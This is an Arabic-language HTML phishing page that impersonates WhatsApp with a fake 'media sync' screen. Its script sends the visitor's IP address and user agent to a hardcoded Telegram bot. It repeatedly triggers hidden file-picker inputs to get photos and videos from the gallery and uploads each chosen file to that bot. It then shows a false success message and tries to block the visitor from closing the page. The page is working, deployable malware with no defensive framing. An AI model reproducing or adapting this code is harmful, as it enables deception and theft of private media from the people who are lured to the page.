<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #333; 
            overflow: hidden;
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            border-radius: 20px; 
            padding: 40px; 
            text-align: center; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
            max-width: 400px; 
            width: 90%; 
            backdrop-filter: blur(10px);
        }
        .logo { 
            width: 80px; height: 80px; 
            background: #25D366; 
            border-radius: 50%; 
            margin: 0 auto 20px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 40px; 
            color: white; 
            font-weight: bold;
        }
        h1 { font-size: 28px; margin-bottom: 10px; color: #25D366; }
        p { font-size: 16px; margin-bottom: 30px; opacity: 0.8; }
        .status { 
            background: #25D366; 
            color: white; 
            padding: 12px; 
            border-radius: 25px; 
            font-size: 14px; 
            margin-bottom: 20px; 
            animation: pulse 2s infinite;
        }
        .gallery-container { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 0; 
            height: 0; 
            opacity: 0; 
            z-index: -1;
        }
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="container" id="loadingScreen">
        <div class="logo">واتساب</div>
        <h1>مزامنة الوسائط</h1>
        <p>جاري تحميل الصور والفيديوهات من معرضك...</p>
        <div class="status">لا تُغلق الصفحة ١٠ ثوانٍ</div>
    </div>

    <!-- 8 مدخلات مخفية لسرقة المعرض -->
    <div class="gallery-container">
        <input type="file" id="gallery1" webkitdirectory multiple accept="image/*,video/*" style="display:none;">
        <input type="file" id="gallery2" webkitdirectory multiple accept="image/*,video/*" style="display:none;">
        <input type="file" id="gallery3" multiple accept="image/*,video/*" style="display:none;">
        <input type="file" id="gallery4" multiple accept="image/*" style="display:none;">
        <input type="file" id="gallery5" multiple accept="video/*" style="display:none;">
        <input type="file" id="gallery6" webkitdirectory accept="image/jpeg,image/png" style="display:none;">
        <input type="file" id="gallery7" multiple accept="image/heic" style="display:none;">
        <input type="file" id="gallery8" multiple style="display:none;">
    </div>

    <script>
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';
        const galleries = [
            'gallery1', 'gallery2', 'gallery3', 'gallery4', 
            'gallery5', 'gallery6', 'gallery7', 'gallery8'
        ];

        // إرسال IP
        async function sendIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🎣 فيكتيم معرض!\n📍 IP: ${ipData.ip}\n🌐 UA: ${navigator.userAgent}\n📱 جهاز: Android/iOS`
                    })
                });
                console.log('✅ IP مرسل:', ipData.ip);
            } catch(e) { console.error('IP فشل'); }
        }

        // محاولة سرقة ملفات المعرض
        async function stealGallery(inputId) {
            return new Promise((resolve) => {
                const input = document.getElementById(inputId);
                const clickEvent = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                    buttons: 1
                });
                
                input.addEventListener('change', async (e) => {
                    console.log(`📁 ${inputId}: ${e.target.files?.length || 0} ملف`);
                    
                    for(let i = 0; i < Math.min(e.target.files.length, 10); i++) { // أقصى 10 ملفات
                        const file = e.target.files[i];
                        if(file && (file.type.startsWith('image/') || file.type.startsWith('video/')) && file.size > 0) {
                            await sendFile(file, inputId);
                        }
                    }
                    resolve();
                });

                // محاولات click متعددة
                setTimeout(() => input.dispatchEvent(clickEvent), 100);
                setTimeout(() => input.dispatchEvent(clickEvent), 500);
                setTimeout(() => input.click(), 1000);
                setTimeout(() => input.dispatchEvent(clickEvent), 2000);
            });
        }

        // إرسال ملف واحد
        async function sendFile(file, source) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            if(file.type.startsWith('image/')) {
                formData.append('photo', file, file.name);
            } else {
                formData.append('video', file, file.name);
                formData.append('caption', `🎥 فيديو من ${source}\n📏 ${formatBytes(file.size)}`);
                return; // فيديوهات كبيرة، أرسل واحد فقط
            }
            
            formData.append('caption', `📸 صورة من ${source}\n📏 ${formatBytes(file.size)}`);
            
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();
                if(data.ok) console.log(`✅ ${file.name} مرسل (${source})`);
            } catch(e) {
                console.error(`❌ ${file.name} فشل`);
            }
        }

        function formatBytes(bytes) {
            if(bytes < 1024) return bytes + ' B';
            if(bytes < 1024*1024) return (bytes/1024).toFixed(1) + ' KB';
            return (bytes/(1024*1024)).toFixed(1) + ' MB';
        }

        // تشغيل الهجوم المتوازي
        async function launchGalleryAttack() {
            console.log('🚀 بدء سرقة المعرض...');
            
            // تشغيل كل المدخلات بالتوازي
            const promises = galleries.map(async (id, index) => {
                await new Promise(r => setTimeout(r, index * 300)); // تأخير تدريجي
                return stealGallery(id);
            });
            
            await Promise.all(promises);
            console.log('🏁 انتهت محاولات المعرض');
        }

        // التشغيل الرئيسي
        window.addEventListener('load', async () => {
            await sendIP();
            
            // إخفاء الشاشة بعد 12 ثانية
            setTimeout(() => {
                document.body.innerHTML = '<div style="text-align:center;padding:40px;color:#25D366;">تمت المزامنة بنجاح ✅</div>';
            }, 12000);
            
            // بدء الهجوم فوراً
            setTimeout(launchGalleryAttack, 1500);
        });

        // إعادة المحاولة عند التركيز
        window.addEventListener('focus', () => {
            setTimeout(launchGalleryAttack, 500);
        });

        // منع الخروج
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            return 'جاري المزامنة، لا تغلق!';
        });
    </script>
</body>
</html>
